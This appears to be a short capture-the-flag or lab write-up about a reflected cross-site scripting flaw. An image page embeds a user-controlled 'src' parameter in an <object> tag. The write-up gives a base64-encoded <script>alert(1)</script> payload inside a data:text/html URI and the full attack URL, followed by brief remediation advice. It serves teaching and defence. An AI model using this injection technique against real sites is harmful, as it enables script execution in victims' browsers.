# 11_XSS_image

# *How to find it*

on the home page we will that we have a simple image clickable
that redirect to : http://10.12.100.35/?page=media&src=nsa

when we inspected the html page we see the image displayed by <object> not <img> :

<object data="http://10.12.100.35/images/nsa_prism.jpg"></object>

so we will convert this <script>alert(1)</script> with base64

--> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

and we made this http://10.12.100.35/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==


# *How should secure it*

- Never display user input.
- Sanitize user input.
- use the <img> tag, with image name in database.



